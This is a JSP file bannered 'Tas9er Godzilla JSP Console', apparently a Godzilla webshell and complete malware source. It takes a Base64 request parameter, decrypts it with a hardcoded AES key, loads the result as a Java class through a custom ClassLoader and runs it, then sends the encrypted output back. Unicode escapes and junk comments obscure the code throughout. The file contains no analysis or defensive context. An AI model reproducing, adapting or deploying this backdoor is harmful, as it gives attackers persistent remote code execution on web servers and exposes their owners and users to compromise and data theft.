Hello Administrator!Welcome To Tas9er Godzilla JSP Console!
<%! String govsb_o5kkwT98c = "78ede65ecff9a1bf";
    String govsb_i = "Tas9er";
    class govsb_S1lacdujPJj7WLL extends /*edusb_W8Kn4HPueXEW*/ClassLoader {
        public govsb_S1lacdujPJj7WLL(ClassLoader govsb_2K5Z) {
            super/*edusb_ey*/(govsb_2K5Z);
        }
        public Class govsb_Y4eYFkGya4(byte[] govsb_0WrFXb5Y0E) {
            return super./*edusb_kGN0BIceL*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*edusb_nrN4Dip7CO*/(govsb_0WrFXb5Y0E, 859154-859154, govsb_0WrFXb5Y0E.length);
        }
    }
    public byte[] govsb_8zB2brZ1(byte[] govsb_WWz, boolean govsb_JAnQTBjgE) {
        try {
            j\u0061\u0076\u0061\u0078./*edusb_DKcwJCPOMA*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher govsb_Vz71c0VvqJxfKQ6 = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*edusb_6v*/("AES");
            govsb_Vz71c0VvqJxfKQ6.init(govsb_JAnQTBjgE?859154/859154:859154/859154+859154/859154,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*edusb_lYxPSGSMwKFhl4o*/SecretKeySpec/*edusb_bCwe*/(govsb_o5kkwT98c.getBytes(), "AES"));
            return govsb_Vz71c0VvqJxfKQ6.doFinal/*edusb_pRGLw6vgi*/(govsb_WWz);
        } catch (Exception e) {
            return null;
        }
     }
    %><%
    try {
        byte[] govsb_8U3B = java.util.Base64./*edusb_gGWPJ5itbFJ1Mu*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*edusb_CjJfwBY*/decode(request.getParameter(govsb_i));
        govsb_8U3B = govsb_8zB2brZ1(govsb_8U3B,false);
        if (session.getAttribute/*edusb_f1p00iDmZ4y9*/("payload") == null) {
            session.setAttribute("payload", new govsb_S1lacdujPJj7WLL(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*edusb_jhO827*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*edusb_nMR0AOWx2*/.govsb_Y4eYFkGya4(govsb_8U3B));
        } else {
            request.setAttribute("parameters", govsb_8U3B);
            java.io.ByteArrayOutputStream govsb_Z = new java.io./*edusb_PyS*/ByteArrayOutputStream();
            Object govsb_YTfZvFw = /*edusb_eYnq*/((Class) session.getAttribute("payload"))./*edusb_4UI9Q*//*edusb_ZSUw*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*edusb_AnI*/;
            govsb_YTfZvFw.equals(govsb_Z);
            govsb_YTfZvFw.equals(pageContext);
            response.getWriter().write("44262F346F57B390D5DA386F6BD4BA8B".substring(859154-859154, 16));
            govsb_YTfZvFw.toString();
            response.getWriter().write(java.util.Base64/*edusb_ntZ5qjbvTblxx9*/.getEncoder()/*edusb_g*/.encodeToString(govsb_8zB2brZ1(govsb_Z.toByteArray(),true)));
            response.getWriter().write("44262F346F57B390D5DA386F6BD4BA8B".substring(16));
        }
    } catch (Exception e) {
    }
%>